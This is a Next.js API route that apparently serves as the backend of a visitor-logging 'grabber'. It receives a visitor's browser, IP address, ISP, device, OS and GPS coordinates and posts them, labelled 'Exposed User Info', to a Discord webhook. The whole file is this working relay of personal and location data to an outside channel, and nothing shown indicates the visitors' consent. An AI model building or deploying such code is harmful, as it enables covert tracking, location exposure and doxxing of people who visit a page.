import { NextResponse, NextRequest } from "next/server";

export async function POST(request: NextRequest) {
  const req = await request.json();

  if (!req) {
    return NextResponse.json({ message: "Invalid request" }, { status: 400 });
  }

  const discordWebhookUrl = process.env.DISCORD_WEBHOOK_URL;

  if (!discordWebhookUrl) {
    console.error("Discord webhook URL is not set in environment variables");
    return NextResponse.json(
      { message: "Server configuration error" },
      { status: 500 }
    );
  }

  try {
    const details = {
      content: `
**Exposed User Info**
- Browser: ${req.browser || "Unknown"}
- IP: ${req.ip || "Unknown"}
- ISP: ${req.isp || "ISP information unavailable"}
- Device: ${req.device || "Unknown"}
- OS: ${req.os || "Unknown"}
${
  req.coordinates
    ? `- Coordinates: ${req.coordinates.latitude}, ${req.coordinates.longitude}`
    : "- Coordinates: Not available"
}
      `,
    };

    const webhookResponse = await fetch(discordWebhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(details),
    });

    if (!webhookResponse.ok) {
      throw new Error(
        `Discord API responded with status: ${webhookResponse.status}`
      );
    }

    return NextResponse.json(
      { message: "Data sent to webhook successfully" },
      { status: 200 }
    );
  } catch (error) {
    console.error("Error sending data to webhook:", error);
    return NextResponse.json(
      { message: "Error sending data to webhook" },
      { status: 500 }
    );
  }
}
